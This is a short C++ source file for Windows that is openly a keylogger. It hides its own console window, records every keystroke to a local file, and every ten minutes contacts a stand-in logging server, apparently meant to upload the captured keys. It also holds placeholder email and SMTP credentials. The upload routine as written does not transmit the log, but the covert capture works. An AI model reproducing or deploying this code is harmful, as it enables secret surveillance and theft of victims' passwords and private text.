x#include <windows.h>
#include <fstream>
#include <string>
#include <wininet.h>
#include <ctime>
#include <thread>

#pragma comment(lib, "wininet.lib")

std::string logFile = "keylog.txt";
std::string email = "user@domain.com";
std::string password = "your_password";
std::string smtpServer = "smtp.gmail.com";
int smtpPort = 587;

// Append keystrokes to file
void SaveKeystroke(int key) {
    std::ofstream log(logFile, std::ios::app);
    if ((key > 64 && key < 91) || (key > 47 && key < 58)) {  // A-Z, 0-9
        log << char(key);
    } else {
        switch (key) {
        case VK_SPACE: log << " "; break;
        case VK_RETURN: log << "\n"; break;
        case VK_BACK: log << "[BACKSPACE]"; break;
        case VK_TAB: log << "[TAB]"; break;
        case VK_SHIFT: log << "[SHIFT]"; break;
        case VK_CONTROL: log << "[CTRL]"; break;
        default: log << "[" << key << "]"; break;
        }
    }
    log.close();
}

// Log all keys
void KeyLogger() {
    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                SaveKeystroke(key);
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

// Send log to email (via web form or SMTP relay)
void SendEmail() {
    HINTERNET hInternet = InternetOpen("Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetOpenUrl(hInternet,
            "http://your-logging-server.com/upload.php", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
}

void StealthMode() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

int main() {
    StealthMode(); // Hide the window
    std::thread logger(KeyLogger);

    // Optionally send email every 10 minutes
    while (true) {
        std::this_thread::sleep_for(std::chrono::minutes(10));
        SendEmail();
    }

    logger.join();
    return 0;
}
